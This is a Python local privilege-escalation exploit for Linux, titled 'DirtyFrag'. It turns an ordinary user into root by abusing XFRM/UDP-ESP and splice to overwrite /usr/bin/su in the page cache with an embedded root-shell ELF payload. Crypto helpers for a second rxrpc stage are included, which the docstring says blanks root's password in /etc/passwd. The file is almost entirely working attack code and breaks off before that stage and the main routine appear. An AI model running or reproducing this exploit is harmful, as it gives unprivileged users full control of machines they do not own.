#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DirtyFrag chain (uid=1000 -> root) — traducción a Python del código C.
Tres partes:
  1) su_lpe_main   : corrompe /usr/bin/su en page cache vía XFRM/UDP-ESP.
  2) rxrpc_lpe_main: parchea /etc/passwd (root::0:0) vía rxrpc/rxkad.
  3) main          : orquesta ambos caminos, abre PTY y exec'ea `su -`.
"""

import os, sys, ctypes, struct, socket, time, errno, fcntl, select
import signal, termios, tty, random, mmap, subprocess

# ===================================================================
#  libc / syscall helpers
# ===================================================================
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long

SYS_setuid    = 105
SYS_setgid    = 106
SYS_setgroups = 116
SYS_add_key   = 248
SYS_keyctl    = 250
SYS_unshare   = 272
SYS_splice    = 275
SYS_vmsplice  = 278

CLONE_NEWUSER = 0x10000000
CLONE_NEWNET  = 0x40000000

KEYCTL_INVALIDATE = 3

class iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p),
                ("iov_len",  ctypes.c_size_t)]

libc.splice.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
                        ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
                        ctypes.c_size_t, ctypes.c_uint]
libc.splice.restype  = ctypes.c_ssize_t

libc.vmsplice.argtypes = [ctypes.c_int, ctypes.POINTER(iovec),
                          ctypes.c_ulong, ctypes.c_uint]
libc.vmsplice.restype  = ctypes.c_ssize_t

libc.unshare.argtypes = [ctypes.c_int]
libc.unshare.restype  = ctypes.c_int

libc.setgroups.argtypes = [ctypes.c_size_t, ctypes.POINTER(ctypes.c_uint32)]
libc.setgroups.restype  = ctypes.c_int

def _ctypes_syscall(num, *args):
    """Call syscall(N) with typed args."""
    return libc.syscall(ctypes.c_long(num), *args)

def add_key(type_, desc, payload, plen, keyring):
    return _ctypes_syscall(
        SYS_add_key,
        ctypes.c_char_p(type_.encode()),
        ctypes.c_char_p(desc.encode()),
        ctypes.c_char_p(bytes(payload)),
        ctypes.c_size_t(plen),
        ctypes.c_int(keyring),
    )

def keyctl(cmd, arg2=0, arg3=0, arg4=0, arg5=0):
    return _ctypes_syscall(
        SYS_keyctl,
        ctypes.c_int(cmd),
        ctypes.c_ulong(arg2), ctypes.c_ulong(arg3),
        ctypes.c_ulong(arg4), ctypes.c_ulong(arg5),
    )

# ===================================================================
#  Constantes del exploit
# ===================================================================
ENC_PORT        = 4500
SEQ_VAL         = 200
REPLAY_SEQ      = 100
TARGET_PATH     = "/usr/bin/su"
PATCH_OFFSET    = 0
PAYLOAD_LEN     = 192
ENTRY_OFFSET    = 0x78

UDP_ENCAP            = 100
UDP_ENCAP_ESPINUDP   = 2
SOL_UDP              = 17

# ELF mínimo root-shell (192 bytes)
shell_elf = bytes([
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
])
assert len(shell_elf) == PAYLOAD_LEN

g_su_verbose = 0

def SLOG(fmt, *a):
    if g_su_verbose:
        sys.stderr.write("[su] " + (fmt % a if a else fmt) + "\n")
        sys.stderr.flush()

# ===================================================================
#  Helpers proc/ns
# ===================================================================
def write_proc(path, buf):
    try:
        fd = os.open(path, os.O_WRONLY)
    except OSError:
        return -1
    try:
        data = buf.encode() if isinstance(buf, str) else buf
        return os.write(fd, data)
    finally:
        os.close(fd)

def setup_userns_netns():
    real_uid = os.getuid()
    real_gid = os.getgid()
    rv = libc.unshare(CLONE_NEWUSER | CLONE_NEWNET)
    if rv < 0:
        err = ctypes.get_errno()
        SLOG("unshare: %s", os.strerror(err))
        sys.exit(1)
    write_proc("/proc/self/setgroups", "deny")
    if write_proc("/proc/self/uid_map", f"0 {real_uid} 1") < 0:
        SLOG("uid_map: %s", os.strerror(ctypes.get_errno())); sys.exit(1)
    if write_proc("/proc/self/gid_map", f"0 {real_gid} 1") < 0:
        SLOG("gid_map: %s", os.strerror(ctypes.get_errno())); sys.exit(1)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        ifr = struct.pack("16sH14x", b"lo", 0)
        # SIOCGIFFLAGS
        try:
            flags = struct.unpack("16sH14x",
                fcntl.ioctl(s.fileno(), 0x8913,
                            struct.pack("16sH14x", b"lo", 0)))[1]
        except OSError as e:
            SLOG("SIOCGIFFLAGS: %s", e); sys.exit(1)
        flags |= 0x1 | 0x40  # IFF_UP | IFF_RUNNING
        try:
            fcntl.ioctl(s.fileno(), 0x8914,
                        struct.pack("16sH14x", b"lo", flags))
        except OSError as e:
            SLOG("SIOCSIFFLAGS: %s", e); sys.exit(1)
    finally:
        s.close()

# ===================================================================
#  Netlink XFRM helpers
# ===================================================================
NLMSG_ALIGNTO    = 4
RTA_ALIGNTO      = 4
NLMSG_ALIGN      = lambda l: (l + NLMSG_ALIGNTO - 1) & ~(NLMSG_ALIGNTO - 1)
RTA_ALIGN        = lambda l: (l + RTA_ALIGNTO   - 1) & ~(RTA_ALIGNTO   - 1)
RTA_LENGTH       = lambda l: 4 + l
NLMSG_LENGTH     = lambda l: 16 + l

XFRM_MSG_NEWSA   = 16
NLM_F_REQUEST    = 0x1
NLM_F_ACK        = 0x4

XFRMA_UNSPEC            = 0
XFRMA_ALG_AUTH          = 1
XFRMA_ALG_CRYPT         = 2
XFRMA_ENCAP             = 4
XFRMA_ALG_AUTH_TRUNC    = 20
XFRMA_REPLAY_ESN_VAL    = 23

XFRM_MODE_TRANSPORT     = 0
XFRM_STATE_ESN          = 0x80

def _inet_addr(ip):
    """Return the 32-bit host-order integer in network byte order (like C)."""
    return struct.unpack("=I", socket.inet_aton(ip))[0]

def _build_xfrm_usersa_info(spi, patch_seqhi):
    # struct xfrm_selector (52 bytes)
    sel_daddr = struct.pack("=I12x", _inet_addr("127.0.0.1"))
    sel_saddr = struct.pack("=I12x", _inet_addr("127.0.0.1"))
    sel = (sel_daddr + sel_saddr +
           struct.pack("=HHHBBBI", 0, 0, socket.AF_INET, 32, 32, 0, 0) +
           struct.pack("=I", 0))                     # user
    assert len(sel) == 52

    # struct xfrm_id (24 bytes) : daddr(16) + spi(4) + proto(1) + pad(3)
    xid = (struct.pack("=I12x", _inet_addr("127.0.0.1")) +
           struct.pack("=IB3x", socket.htonl(spi), socket.IPPROTO_ESP))
    assert len(xid) == 24

    saddr = struct.pack("=I12x", _inet_addr("127.0.0.1"))

    lft = struct.pack("=8Q", *([0xFFFFFFFFFFFFFFFF] * 4 + [0, 0, 0, 0]))
    curlft = b"\x00" * 32
    stats  = b"\x00" * 12

    tail = (struct.pack("=II", 0, 0x1234) +     # seq, reqid
            struct.pack("=HBBBx", socket.AF_INET,
                        XFRM_MODE_TRANSPORT, 0, XFRM_STATE_ESN))

    info = sel + xid + saddr + lft + curlft + stats + tail
    assert len(info) == 216, len(info)
    return bytearray(info)

def _put_attr(nlh, typ, data):
    rta_len = RTA_LENGTH(len(data))
    hdr = struct.pack("=HH", rta_len, typ)
    pad = b"\x00" * (RTA_ALIGN(rta_len) - rta_len)
    nlh.extend(hdr + data + pad)

def add_xfrm_sa(spi, patch_seqhi):
    try:
        sk = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 6)  # NETLINK_XFRM
    except OSError:
        return -1
    try:
        sk.bind((0, 0))
        info = _build_xfrm_usersa_info(spi, patch_seqhi)

        # NLMSG header
        hdr = bytearray(struct.pack("=IHHII",
                                    NLMSG_LENGTH(len(info)),
                                    XFRM_MSG_NEWSA,
                                    NLM_F_REQUEST | NLM_F_ACK,
                                    1, os.getpid()))
        nlh = hdr + bytearray(info)

        # XFRMA_ALG_AUTH_TRUNC (hmac(sha256) 32-byte key, trunc 128)
        aa = bytearray(72 + 32)
        aa[0:len(b"hmac(sha256)")] = b"hmac(sha256)"
        struct.pack_into("=II", aa, 64, 32 * 8, 128)
        aa[72:72+32] = b"\xAA" * 32
        _put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, bytes(aa))

        # XFRMA_ALG_CRYPT (cbc(aes) 16-byte key)
        ea = bytearray(68 + 16)
        ea[0:len(b"cbc(aes)")] = b"cbc(aes)"
        struct.pack_into("=I", ea, 64, 16 * 8)
        ea[68:68+16] = b"\xBB" * 16
        _put_attr(nlh, XFRMA_ALG_CRYPT, bytes(ea))

        # XFRMA_ENCAP
        enc = struct.pack("=HHH", UDP_ENCAP_ESPINUDP,
                          socket.htons(ENC_PORT),
                          socket.htons(ENC_PORT)) + b"\x00" * 16
        enc += b"\x00" * 2  # padding to 4
        _put_attr(nlh, XFRMA_ENCAP, enc)

        # XFRMA_REPLAY_ESN_VAL
        esn = struct.pack("=IIIIII",
                          1, 0, REPLAY_SEQ, 0,
                          patch_seqhi & 0xFFFFFFFF,
                          32)
        esn += struct.pack("=I", 0)  # one bmp word
        _put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn)

        # Fix up total length
        struct.pack_into("=I", nlh, 0, len(nlh))

        sk.send(bytes(nlh))
        rbuf = sk.recv(4096)
        if len(rbuf) >= 4:
            nlmsg_type = struct.unpack_from("=H", rbuf, 4)[0]
            if nlmsg_type == 2:  # NLMSG_ERROR
                err = struct.unpack_from("=i", rbuf, 16)[0]
                if err != 0:
                    return -1
        return 0
    except OSError:
        return -1
    finally:
        sk.close()

# ===================================================================
#  SPLICE + UDP-ESP trigger
# ===================================================================
def _vmsplice_write(pfd_w, data: bytes) -> int:
    buf = ctypes.create_string_buffer(data, len(data))
    iov = iovec(ctypes.cast(buf, ctypes.c_void_p), len(data))
    return libc.vmsplice(pfd_w, ctypes.byref(iov), 1, 0)

def _splice_file_to_pipe(file_fd, off, pfd_w, n):
    off_c = ctypes.c_int64(off)
    return libc.splice(file_fd, ctypes.byref(off_c), pfd_w, None,
                       n, 0)

def _splice_pipe_to_sock(pfd_r, sock_fd, n):
    return libc.splice(pfd_r, None, sock_fd, None, n, 0)

def do_one_write(path, offset, spi):
    sk_recv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk_recv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sk_recv.bind(("127.0.0.1", ENC_PORT))
    except OSError:
        sk_recv.close(); return -1

    try:
        sk_recv.setsockopt(socket.IPPROTO_UDP, UDP_ENCAP,
                           struct.pack("=i", UDP_ENCAP_ESPINUDP))
    except OSError:
        sk_recv.close(); return -1

    sk_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sk_send.connect(("127.0.0.1", ENC_PORT))
    except OSError:
        sk_send.close(); sk_recv.close(); return -1

    try:
        file_fd = os.open(path, os.O_RDONLY)
    except OSError:
        sk_send.close(); sk_recv.close(); return -1

    pfd_r, pfd_w = os.pipe()

    hdr = bytearray(24)
    struct.pack_into("=II", hdr, 0, socket.htonl(spi), socket.htonl(SEQ_VAL))
    hdr[8:24] = b"\xCC" * 16

    try:
        if _vmsplice_write(pfd_w, bytes(hdr)) != 24:
            raise OSError("vmsplice hdr failed")
        if _splice_file_to_pipe(file_fd, offset, pfd_w, 16) != 16:
            raise OSError("splice file->pipe failed")
        # Move header+payload to the socket
        _splice_pipe_to_sock(pfd_r, sk_send.fileno(), 24 + 16)
        time.sleep(0.150)
        return 0
    except OSError:
        return -1
    finally:
        os.close(file_fd)
        os.close(pfd_r); os.close(pfd_w)
        sk_send.close(); sk_recv.close()

def verify_byte(path, offset, want):
    try:
        fd = os.open(path, os.O_RDONLY)
    except OSError:
        return -1
    try:
        got = os.pread(fd, 1, offset)
        return 0 if got and got[0] == want else -1
    finally:
        os.close(fd)

def corrupt_su():
    setup_userns_netns()
    time.sleep(0.1)
    for i in range(PAYLOAD_LEN // 4):
        spi = 0xDEADBE10 + i
        seqhi = struct.unpack_from("=I", shell_elf, i * 4)[0]
        if add_xfrm_sa(spi, seqhi) < 0:
            SLOG("add_xfrm_sa #%d failed", i)
            return -1
    SLOG("installed %d xfrm SAs", PAYLOAD_LEN // 4)
    for i in range(PAYLOAD_LEN // 4):
        spi = 0xDEADBE10 + i
        off = PATCH_OFFSET + i * 4
        if do_one_write(TARGET_PATH, off, spi) < 0:
            SLOG("do_one_write #%d at off=0x%lx failed", i, off)
            return -1
    SLOG("wrote %d bytes to %s starting at 0x%x",
         PAYLOAD_LEN, TARGET_PATH, PATCH_OFFSET)
    return 0

def su_lpe_main(argv):
    global g_su_verbose
    for a in argv[1:]:
        if a in ("-v", "--verbose"):
            g_su_verbose = 1
    if os.environ.get("DIRTYFRAG_VERBOSE"):
        g_su_verbose = 1

    pid = os.fork()
    if pid == 0:
        rc = corrupt_su()
        os._exit(0 if rc == 0 else 2)
    _, status = os.waitpid(pid, 0)
    if not (os.WIFEXITED(status) and os.WEXITSTATUS(status) == 0):
        SLOG("corruption stage failed (status=0x%x)", status)
        return 1

    if verify_byte(TARGET_PATH, ENTRY_OFFSET, 0x31) != 0 or \
       verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xFF) != 0:
        SLOG("post-write verify failed (target unchanged)")
        return 1
    SLOG("/usr/bin/su page-cache patched (entry 0x%x = shellcode)",
         ENTRY_OFFSET)
    return 0

# ===================================================================
#  FCRYPT (kernel port)
# ===================================================================
fc_sbox0_raw = bytes([
    0xea,0x7f,0xb2,0x64,0x9d,0xb0,0xd9,0x11,0xcd,0x86,0x86,0x91,0x0a,0xb2,0x93,0x06,
    0x0e,0x06,0xd2,0x65,0x73,0xc5,0x28,0x60,0xf2,0x20,0xb5,0x38,0x7e,0xda,0x9f,0xe3,
    0xd2,0xcf,0xc4,0x3c,0x61,0xff,0x4a,0x4a,0x35,0xac,0xaa,0x5f,0x2b,0xbb,0xbc,0x53,
    0x4e,0x9d,0x78,0xa3,0xdc,0x09,0x32,0x10,0xc6,0x6f,0x66,0xd6,0xab,0xa9,0xaf,0xfd,
    0x3b,0x95,0xe8,0x34,0x9a,0x81,0x72,0x80,0x9c,0xf3,0xec,0xda,0x9f,0x26,0x76,0x15,
    0x3e,0x55,0x4d,0xde,0x84,0xee,0xad,0xc7,0xf1,0x6b,0x3d,0xd3,0x04,0x49,0xaa,0x24,
    0x0b,0x8a,0x83,0xba,0xfa,0x85,0xa0,0xa8,0xb1,0xd4,0x01,0xd8,0x70,0x64,0xf0,0x51,
    0xd2,0xc3,0xa7,0x75,0x8c,0xa5,0x64,0xef,0x10,0x4e,0xb7,0xc6,0x61,0x03,0xeb,0x44,
    0x3d,0xe5,0xb3,0x5b,0xae,0xd5,0xad,0x1d,0xfa,0x5a,0x1e,0x33,0xab,0x93,0xa2,0xb7,
    0xe7,0xa8,0x45,0xa4,0xcd,0x29,0x63,0x44,0xb6,0x69,0x7e,0x2e,0x62,0x03,0xc8,0xe0,
    0x17,0xbb,0xc7,0xf3,0x3f,0x36,0xba,0x71,0x8e,0x97,0x65,0x60,0x69,0xb6,0xf6,0xe6,
    0x6e,0xe0,0x81,0x59,0xe8,0xaf,0xdd,0x95,0x22,0x99,0xfd,0x63,0x19,0x74,0x61,0xb1,
    0xb6,0x5b,0xae,0x54,0xb3,0x70,0xff,0xc6,0x3b,0x3e,0xc1,0xd7,0xe1,0x0e,0x76,0xe5,
    0x36,0x4f,0x59,0xc7,0x08,0x6e,0x82,0xa6,0x93,0xc4,0xaa,0x26,0x49,0xe0,0x21,0x64,
    0x07,0x9f,0x64,0x81,0x9c,0xbf,0xf9,0xd1,0x43,0xf8,0xb6,0xb9,0xf1,0x24,0x75,0x03,
    0xe4,0xb0,0x99,0x46,0x3d,0xf5,0xd1,0x39,0x72,0x12,0xf6,0xba,0x0c,0x0d,0x42,0x2e,
])
fc_sbox1_raw = bytes([
    0x77,0x14,0xa6,0xfe,0xb2,0x5e,0x8c,0x3e,0x67,0x6c,0xa1,0x0d,0xc2,0xa2,0xc1,0x85,
    0x6c,0x7b,0x67,0xc6,0x23,0xe3,0xf2,0x89,0x50,0x9c,0x03,0xb7,0x73,0xe6,0xe1,0x39,
    0x31,0x2c,0x27,0x9f,0xa5,0x69,0x44,0xd6,0x23,0x83,0x98,0x7d,0x3c,0xb4,0x2d,0x99,
    0x1c,0x1f,0x8c,0x20,0x03,0x7c,0x5f,0xad,0xf4,0xfa,0x95,0xca,0x76,0x44,0xcd,0xb6,
    0xb8,0xa1,0xa1,0xbe,0x9e,0x54,0x8f,0x0b,0x16,0x74,0x31,0x8a,0x23,0x17,0x04,0xfa,
    0x79,0x84,0xb1,0xf5,0x13,0xab,0xb5,0x2e,0xaa,0x0c,0x60,0x6b,0x5b,0xc4,0x4b,0xbc,
    0xe2,0xaf,0x45,0x73,0xfa,0xc9,0x49,0xcd,0x00,0x92,0x7d,0x97,0x7a,0x18,0x60,0x3d,
    0xcf,0x5b,0xde,0xc6,0xe2,0xe6,0xbb,0x8b,0x06,0xda,0x08,0x15,0x1b,0x88,0x6a,0x17,
    0x89,0xd0,0xa9,0xc1,0xc9,0x70,0x6b,0xe5,0x43,0xf4,0x68,0xc8,0xd3,0x84,0x28,0x0a,
    0x52,0x66,0xa3,0xca,0xf2,0xe3,0x7f,0x7a,0x31,0xf7,0x88,0x94,0x5e,0x9c,0x63,0xd5,
    0x24,0x66,0xfc,0xb3,0x57,0x25,0xbe,0x89,0x44,0xc4,0xe0,0x8f,0x23,0x3c,0x12,0x52,
    0xf5,0x1e,0xf4,0xcb,0x18,0x33,0x1f,0xf8,0x69,0x10,0x9d,0xd3,0xf7,0x28,0xf8,0x30,
    0x05,0x5e,0x32,0xc0,0xd5,0x19,0xbd,0x45,0x8b,0x5b,0xfd,0xbc,0xe2,0x5c,0xa9,0x96,
    0xef,0x70,0xcf,0xc2,0x2a,0xb3,0x61,0xad,0x80,0x48,0x81,0xb7,0x1d,0x43,0xd9,0xd7,
    0x45,0xf0,0xd8,0x8a,0x59,0x7c,0x57,0xc1,0x79,0xc7,0x34,0xd6,0x43,0xdf,0xe4,0x78,
    0x16,0x06,0xda,0x92,0x76,0x51,0xe1,0xd4,0x70,0x03,0xe0,0x2f,0x96,0x91,0x82,0x80,
])
fc_sbox2_raw = bytes([
    0xf0,0x37,0x24,0x53,0x2a,0x03,0x83,0x86,0xd1,0xec,0x50,0xf0,0x42,0x78,0x2f,0x6d,
    0xbf,0x80,0x87,0x27,0x95,0xe2,0xc5,0x5d,0xf9,0x6f,0xdb,0xb4,0x65,0x6e,0xe7,0x24,
    0xc8,0x1a,0xbb,0x49,0xb5,0x0a,0x7d,0xb9,0xe8,0xdc,0xb7,0xd9,0x45,0x20,0x1b,0xce,
    0x59,0x9d,0x6b,0xbd,0x0e,0x8f,0xa3,0xa9,0xbc,0x74,0xa6,0xf6,0x7f,0x5f,0xb1,0x68,
    0x84,0xbc,0xa9,0xfd,0x55,0x50,0xe9,0xb6,0x13,0x5e,0x07,0xb8,0x95,0x02,0xc0,0xd0,
    0x6a,0x1a,0x85,0xbd,0xb6,0xfd,0xfe,0x17,0x3f,0x09,0xa3,0x8d,0xfb,0xed,0xda,0x1d,
    0x6d,0x1c,0x6c,0x01,0x5a,0xe5,0x71,0x3e,0x8b,0x6b,0xbe,0x29,0xeb,0x12,0x19,0x34,
    0xcd,0xb3,0xbd,0x35,0xea,0x4b,0xd5,0xae,0x2a,0x79,0x5a,0xa5,0x32,0x12,0x7b,0xdc,
    0x2c,0xd0,0x22,0x4b,0xb1,0x85,0x59,0x80,0xc0,0x30,0x9f,0x73,0xd3,0x14,0x48,0x40,
    0x07,0x2d,0x8f,0x80,0x0f,0xce,0x0b,0x5e,0xb7,0x5e,0xac,0x24,0x94,0x4a,0x18,0x15,
    0x05,0xe8,0x02,0x77,0xa9,0xc7,0x40,0x45,0x89,0xd1,0xea,0xde,0x0c,0x79,0x2a,0x99,
    0x6c,0x3e,0x95,0xdd,0x8c,0x7d,0xad,0x6f,0xdc,0xff,0xfd,0x62,0x47,0xb3,0x21,0x8a,
    0xec,0x8e,0x19,0x18,0xb4,0x6e,0x3d,0xfd,0x74,0x54,0x1e,0x04,0x85,0xd8,0xbc,0x1f,
    0x56,0xe7,0x3a,0x56,0x67,0xd6,0xc8,0xa5,0xf3,0x8e,0xde,0xae,0x37,0x49,0xb7,0xfa,
    0xc8,0xf4,0x1f,0xe0,0x2a,0x9b,0x15,0xd1,0x34,0x0e,0xb5,0xe0,0x44,0x78,0x84,0x59,
    0x56,0x68,0x77,0xa5,0x14,0x06,0xf5,0x2f,0x8c,0x8a,0x73,0x80,0x76,0xb4,0x10,0x86,
])
fc_sbox3_raw = bytes([
    0xa9,0x2a,0x48,0x51,0x84,0x7e,0x49,0xe2,0xb5,0xb7,0x42,0x33,0x7d,0x5d,0xa6,0x12,
    0x44,0x48,0x6d,0x28,0xaa,0x20,0x6d,0x57,0xd6,0x6b,0x5d,0x72,0xf0,0x92,0x5a,0x1b,
    0x53,0x80,0x24,0x70,0x9a,0xcc,0xa7,0x66,0xa1,0x01,0xa5,0x41,0x97,0x41,0x31,0x82,
    0xf1,0x14,0xcf,0x53,0x0d,0xa0,0x10,0xcc,0x2a,0x7d,0xd2,0xbf,0x4b,0x1a,0xdb,0x16,
    0x47,0xf6,0x51,0x36,0xed,0xf3,0xb9,0x1a,0xa7,0xdf,0x29,0x43,0x01,0x54,0x70,0xa4,
    0xbf,0xd4,0x0b,0x53,0x44,0x60,0x9e,0x23,0xa1,0x18,0x68,0x4f,0xf0,0x2f,0x82,0xc2,
    0x2a,0x41,0xb2,0x42,0x0c,0xed,0x0c,0x1d,0x13,0x3a,0x3c,0x6e,0x35,0xdc,0x60,0x65,
    0x85,0xe9,0x64,0x02,0x9a,0x3f,0x9f,0x87,0x96,0xdf,0xbe,0xf2,0xcb,0xe5,0x6c,0xd4,
    0x5a,0x83,0xbf,0x92,0x1b,0x94,0x00,0x42,0xcf,0x4b,0x00,0x75,0xba,0x8f,0x76,0x5f,
    0x5d,0x3a,0x4d,0x09,0x12,0x08,0x38,0x95,0x17,0xe4,0x01,0x1d,0x4c,0xa9,0xcc,0x85,
    0x82,0x4c,0x9d,0x2f,0x3b,0x66,0xa1,0x34,0x10,0xcd,0x59,0x89,0xa5,0x31,0xcf,0x05,
    0xc8,0x84,0xfa,0xc7,0xba,0x4e,0x8b,0x1a,0x19,0xf1,0xa1,0x3b,0x18,0x12,0x17,0xb0,
    0x98,0x8d,0x0b,0x23,0xc3,0x3a,0x2d,0x20,0xdf,0x13,0xa0,0xa8,0x4c,0x0d,0x6c,0x2f,
    0x47,0x13,0x13,0x52,0x1f,0x2d,0xf5,0x79,0x3d,0xa2,0x54,0xbd,0x69,0xc8,0x6b,0xf3,
    0x05,0x28,0xf1,0x16,0x46,0x40,0xb0,0x11,0xd3,0xb7,0x95,0x49,0xcf,0xc3,0x1d,0x8f,
    0xd8,0xe1,0x73,0xdb,0xad,0xc8,0xc9,0xa9,0xa1,0xc2,0xc5,0xe3,0xba,0xfc,0x0e,0x25,
])

fc_sbox0 = [0]*256
fc_sbox1 = [0]*256
fc_sbox2 = [0]*256
fc_sbox3 = [0]*256

def _htobe32(v):
    return socket.htonl(v & 0xFFFFFFFF)

def fcrypt_init_sboxes():
    for i in range(256):
        fc_sbox0[i] = _htobe32(fc_sbox0_raw[i] << 3)
        fc_sbox1[i] = _htobe32(((fc_sbox1_raw[i] & 0x1f) << 27) |
                               ((fc_sbox1_raw[i]) >> 5))
        fc_sbox2[i] = _htobe32(fc_sbox2_raw[i] << 11)
        fc_sbox3[i] = _htobe32(fc_sbox3_raw[i] << 19)

def _ror56_64(k, n):
    return ((k >> n) | ((k & ((1 << n) - 1)) << (56 - n))) & 0xFFFFFFFFFFFFFF

def fcrypt_user_setkey(key: bytes):
    k = 0
    for i in range(8):
        k = (k << 7) | (key[i] >> 1)
    sched = [0] * 16
    for i in range(15):
        sched[i] = _htobe32(k & 0xFFFFFFFF)
        k = _ror56_64(k, 11)
    sched[15] = _htobe32(k & 0xFFFFFFFF)
    return sched

def _FC_F(R, L, sched_entry):
    u = (sched_entry ^ R) & 0xFFFFFFFF
    c0 = u & 0xff
    c1 = (u >> 8) & 0xff
    c2 = (u >> 16) & 0xff
    c3 = (u >> 24) & 0xff
    return L ^ fc_sbox0[c0] ^ fc_sbox1[c1] ^ fc_sbox2[c2] ^ fc_sbox3[c3]

def fcrypt_user_decrypt(sched, ct: bytes) -> bytes:
    L = struct.unpack("=I", ct[0:4])[0]
    R = struct.unpack("=I", ct[4:8])[0]
    order = [0xf, 0xe, 0xd, 0xc, 0xb, 0xa, 0x9, 0x8,
             0x7, 0x6, 0x5, 0x4, 0x3, 0x2, 0x1, 0x0]
    for idx, sc in enumerate(order):
        if idx % 2 == 0:
            R = _FC_F(L, R, sched[sc])
        else:
            L = _FC_F(R, L, sched[sc])
    return struct.pack("=I", L) + struct.pack("=I", R)

# ===================================================================
#  AF_ALG pcbc(fcrypt)
# ===================================================================
SOL_ALG       = 279
ALG_SET_KEY   = 1
ALG_SET_IV    = 2
ALG_SET_OP    = 3
ALG_OP_DECRYPT= 0
ALG_OP_ENCRYPT= 1
AF_ALG_FAM    = 38

libc.socket.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_int]
libc.socket.restype  = ctypes.c_int
libc.bind.argtypes   = [ctypes.c_int, ctypes.c_void_p, ctypes.c_uint]
libc.bind.restype    = ctypes.c_int
libc.setsockopt.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_int,
                            ctypes.c_void_p, ctypes.c_uint]
libc.setsockopt.restype  = ctypes.c_int
libc.accept.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p]
libc.accept.restype  = ctypes.c_int

def alg_open_pcbc_fcrypt(key: bytes) -> int:
    s = libc.socket(AF_ALG_FAM, socket.SOCK_SEQPACKET, 0)
    if s < 0:
        sys.stderr.write("[!] socket(AF_ALG): %s\n" % os.strerror(ctypes.get_errno()))
        return -1
    sa = struct.pack("=H14sII64s", AF_ALG_FAM,
                     b"skcipher", 0, 0, b"pcbc(fcrypt)")
    if libc.bind(s, sa, len(sa)) < 0:
        sys.stderr.write("[!] bind(AF_ALG pcbc(fcrypt)): %s\n" % os.strerror(ctypes.get_errno()))
        libc.close(s); return -1
    keybuf = ctypes.create_string_buffer(key, len(key))
    if libc.setsockopt(s, SOL_ALG, ALG_SET_KEY, keybuf, len(key)) < 0:
        sys.stderr.write("[!] ALG_SET_KEY: %s\n" % os.strerror(ctypes.get_errno()))
        libc.close(s); return -1
    return s

def alg_op(alg_s, op, iv: bytes, data: bytes) -> bytes:
    op_fd = libc.accept(alg_s, None, None)
    if op_fd < 0:
        sys.stderr.write("[!] accept(AF_ALG): %s\n" % os.strerror(ctypes.get_errno()))
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    try:
        sock = socket.socket(fileno=op_fd)
        try:
            cmsgs = [
                (SOL_ALG, ALG_SET_OP, struct.pack("=I", op)),
                (SOL_ALG, ALG_SET_IV, struct.pack("=I", len(iv)) + iv),
            ]
            sock.sendmsg([data], cmsgs)
            out = b""
            need = len(data)
            while len(out) < need:
                chunk = sock.recv(need - len(out))
                if not chunk:
                    break
                out += chunk
            return out
        finally:
            sock.close()
    except OSError:
        try: libc.close(op_fd)
        except Exception: pass
        raise

def compute_csum_iv(epoch, cid, sec_ix, key):
    s = alg_open_pcbc_fcrypt(key)
    if s < 0: return None
    try:
        inp = struct.pack("=IIII",
                          socket.htonl(epoch), socket.htonl(cid),
                          0, socket.htonl(sec_ix))
        out = alg_op(s, ALG_OP_ENCRYPT, key, inp)
        if len(out) < 16: return None
        return out[8:16]
    finally:
        libc.close(s)

def compute_cksum(cid, call_id, seq, key, csum_iv):
    s = alg_open_pcbc_fcrypt(key)
    if s < 0: return None
    try:
        x = ((cid & 3) << 30) | (seq & 0x3FFFFFFF)
        inp = struct.pack("=II", socket.htonl(call_id), socket.htonl(x))
        out = alg_op(s, ALG_OP_ENCRYPT, csum_iv, inp)
        if len(out) < 8: return None
        y = socket.ntohl(struct.unpack("=I", out[4:8])[0])
        v = (y >> 16) & 0xFFFF
        return v if v else 1
    finally:
        libc.close(s)

# ===================================================================
#  AF_RXRPC
# ===================================================================
AF_RXRPC     = 33
SOL_RXRPC    = 272
RXRPC_SECURITY_KEY        = 1
RXRPC_MIN_SECURITY_LEVEL  = 2
